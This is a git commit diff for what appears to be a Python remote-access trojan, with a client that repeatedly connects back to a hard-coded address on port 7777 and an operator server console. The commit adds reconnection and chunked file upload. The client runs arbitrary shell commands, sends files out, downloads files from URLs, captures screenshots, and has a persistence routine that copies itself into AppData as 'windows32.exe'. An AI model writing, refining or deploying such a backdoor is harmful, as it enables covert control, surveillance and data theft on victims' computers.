55c7de69dcd80d3a655aa9b26b02088b548ef99c
Jeffield97 <jchariguaman@gmail.com>
2024-06-09 08:27:41 -0500

    FIX:Reconnection and upload function

--- Client/client.py
+++ Client/client.py
@@ -8,6 +8,18 @@ import requests
 import mss
 import os
 import shutil
+import time
+
+def connect_to_server(host, port):
+    while True:
+        try:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((host, port))
+            print("Conectado al servidor")
+            return client_socket
+        except socket.error as e:
+            print(f"Fallo al conectar, reintentando en 5 segundos... Error: {e}")
+            time.sleep(5)      
 
 def create_persistence():
     location = os.environ['appdata']+'\\windows32.exe'
@@ -28,57 +40,74 @@ def take_screenshot():
             encoded_screenshot = base64.b64encode(file.read())
     return encoded_screenshot
 
-def shell():
+def shell(client):
     current_dir = os.getcwd()
     client.send(current_dir.encode())
-    while True:
-        res= client.recv(10024).decode()
-        print(res)
-        if res == "exit":
-            break
-        elif res[:2] == "cd" and len(res)>2:
-            try:
-                os.chdir(res[3:])
-                result = os.getcwd()
-            except FileNotFoundError:
-                result = f"Error: Directory '{res[3:]}' does not exist."
-            except Exception as e:
-                result = f"Error: {str(e)}"
-            client.send(result.encode())
-        elif res[:8] == "download":
-            with open(res[9:],"rb") as file_download:
-                client.send(base64.b64encode(file_download.read()))
-        elif res[:6]=="upload":
-            print(f"Recibiendo: {res[:7]}")
-            try:
-                with open(res[7:],"wb") as file_upload:
-                    data = client.recv(300000).decode()
-                    file_upload.write(base64.b64decode(data))
-            except:
-                print("File upload failed")
-        elif res[:4]=="wget":
-            try:
-                print(f"Command to download from internet {res[:4]}")
-                download_file_url(res[4:])
-                client.send("File downloaded success!".encode())
-            except:
-                client.send("File error download!".encode())
-        elif res[:10]=="screenshot":
-            try:
-                screenshot_data= take_screenshot()
-                client.send(screenshot_data)
-                os.remove("temp_screenshot.png")
-            except:
-                client.send("Screenshoot failed..\n".encode())
-        else:
-            proc = subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-            result = proc.stdout.read() + proc.stderr.read()
-            if len(result)==0:
-                client.send("1".encode())
+    try:
+        while True:
+            res = client.recv(1024).decode()
+            if res == "exit":
+                break
+            elif res[:2] == "cd" and len(res) > 2:
+                try:
+                    os.chdir(res[3:])
+                    result = os.getcwd()
+                except FileNotFoundError:
+                    result = f"Error: Directory '{res[3:]}' does not exist."
+                except Exception as e:
+                    result = f"Error: {str(e)}"
+                client.send(result.encode())
+            elif res[:8] == "download":
+                with open(res[9:], "rb") as file_download:
+                    client.send(base64.b64encode(file_download.read()))
+            elif res[:6] == "upload":
+                file_path = res[7:]
+                print(f"Recibiendo: {file_path}")
+                try:
+                    with open(file_path, "wb") as file_upload:
+                        while True:
+                            data = client.recv(4096)
+                            if data == b'EOF':
+                                print("EOF received")
+                                break
+                            # Eliminar el '\n' antes de decodificar
+                            file_upload.write(base64.b64decode(data.strip()))
+                        print("File received successfully")
+                except Exception as e:
+                    print(f"File upload failed: {e}")
+
+
+            elif res[:4] == "wget":
+                try:
+                    print(f"Command to download from internet {res[:4]}")
+                    download_file_url(res[4:])
+                    client.send("File downloaded success!".encode())
+                except Exception as e:
+                    client.send(f"File error download! {e}".encode())
+            elif res[:10] == "screenshot":
+                try:
+                    screenshot_data = take_screenshot()
+                    client.send(screenshot_data)
+                    os.remove("temp_screenshot.png")
+                except Exception as e:
+                    client.send(f"Screenshot failed: {e}\n".encode())
             else:
-                client.send(result)
-create_persistence()
-client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-client.connect(('192.168.100.68',7777))
-shell()
-client.close()
+                proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = proc.stdout.read() + proc.stderr.read()
+                if len(result) == 0:
+                    client.send("1".encode())
+                else:
+                    client.send(result)
+    except socket.error as e:
+        print(f"Error connection: {e}")
+    finally:
+        try:
+            client.close()
+        except Exception as e:
+            print(f"Error al cerrar el socket: {e}")
+
+# create_persistence()
+while True:
+        client = connect_to_server('192.168.100.68',7777)
+        shell(client)
+        time.sleep(5)
--- server.py
+++ server.py
@@ -20,66 +20,77 @@ def receive_full_data(sock, buffer_size=4096, timeout=2):
 
 
 def shell():
-	current_dir = target.recv(1024).decode()
-	while True:
-		command = input("{}~#:".format(current_dir))
-		if command == "exit":
-			target.send(command.encode())
-			break
-		elif command[:2] =="cd":
-			target.send(command.encode())
-			res=target.recv(1024).decode()
-			current_dir = res
-		elif command == "":
-			pass
-		elif command[:8] == "download":
-			target.send(command.encode())
-			with open(command[9:],"wb") as file_download:
-				data = target.recv(40000).decode()
-				file_download.write(base64.b64decode(data))
-		elif command[:6] == "upload":
-			file_path = command[7:]
-			print(f"Uploading file: {file_path}")
-			try:
-				target.send(command.encode())
-				with open(command[7:],"rb") as file_upload:
-					target.send(base64.b64encode(file_upload.read()))
-			except:
-				print(f"File not found: {file_path}")
-		elif command[:4] =="wget":
-			target.send(command.encode())
-			res=target.recv(1024).decode()
-			print(res)
-		elif command[:10]=='screenshot':
-			target.send(command.encode())
-			now= datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-			with open(f"screen{now}.png","wb") as screenFile:
-				data = receive_full_data(target)
-				if data:
-					screenFile.write(base64.b64decode(data))
-				else:
-					print("No data received.")
-		else:
-			target.send(command.encode())
-			res = target.recv(30000).decode()
-			if res=="1":
-				continue
-			else:
-				print(res)
+    current_dir = target.recv(1024).decode()
+    while True:
+        command = input("{}~#:".format(current_dir))
+        if command == "exit":
+            target.send(command.encode())
+            break
+        elif command[:2] =="cd":
+            target.send(command.encode())
+            res=target.recv(1024).decode()
+            current_dir = res
+        elif command == "":
+            pass
+        elif command[:8] == "download":
+            target.send(command.encode())
+            with open(command[9:],"wb") as file_download:
+                data = target.recv(40000).decode()
+                file_download.write(base64.b64decode(data))
+        elif command[:6] == "upload":
+            file_path = command[7:]
+            print(f"Uploading file: {file_path}")
+            try:
+                with open(file_path, "rb") as file_upload:
+                    target.send(command.encode())
+                    while True:
+                        chunk = file_upload.read(3*1024)
+                        if not chunk:
+                            break
+                        encoded_chunk = base64.b64encode(chunk)
+                        print(f"Sending chunk: {encoded_chunk[:60]}...")  # Imprime parte del chunk para depuración
+                        target.send(encoded_chunk + b'\n')  # Agregamos '\n' para separar los chunks
+                    target.send(b'EOF')  # Enviar un marcador de fin de archivo
+                    print("File upload complete")
+            except FileNotFoundError:
+                print(f"File not found: {file_path}")
+            except Exception as e:
+                print(f"Error uploading file: {e}")
+
+        elif command[:4] =="wget":
+            target.send(command.encode())
+            res=target.recv(1024).decode()
+            print(res)
+        elif command[:10]=='screenshot':
+            target.send(command.encode())
+            now= datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            with open(f"screen{now}.png","wb") as screenFile:
+                data = receive_full_data(target)
+                if data:
+                    screenFile.write(base64.b64decode(data))
+                else:
+                    print("No data received.")
+        else:
+            target.send(command.encode())
+            res = target.recv(30000).decode()
+            if res=="1":
+                continue
+            else:
+                print(res)
 
 def startServer():
-	global server
-	global ip
-	global target
-	
-	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
-	server.bind(('192.168.100.68',7777))
-	server.listen(1)
-	print("Server running, listening on PORT 7777")
+    global server
+    global ip
+    global target
+    
+    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
+    server.bind(('192.168.100.68',7777))
+    server.listen(1)
+    print("Server running, listening on PORT 7777")
 
-	target, ip = server.accept()
-	print("Established connection from "+ str(ip[0]))
+    target, ip = server.accept()
+    print("Established connection from "+ str(ip[0]))
 
 startServer()
 shell()
